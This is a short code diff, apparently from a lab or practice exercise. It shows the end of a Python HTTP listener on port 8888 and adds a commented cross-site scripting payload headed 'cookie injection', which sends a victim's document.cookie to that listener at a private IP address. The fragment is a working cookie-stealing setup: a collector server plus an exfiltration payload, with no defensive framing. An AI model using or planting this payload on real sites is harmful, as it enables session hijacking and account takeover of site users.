@@ -11,4 +11,6 @@ server = HTTPServer(('0.0.0.0', 8888), Handler)
 print("Listening on port 8888...")
 server.serve_forever()
 
-
+#cookie injection
+#
+#<script>new Image().src="http://192.168.56.1:8888/?c="+document.cookie</script>
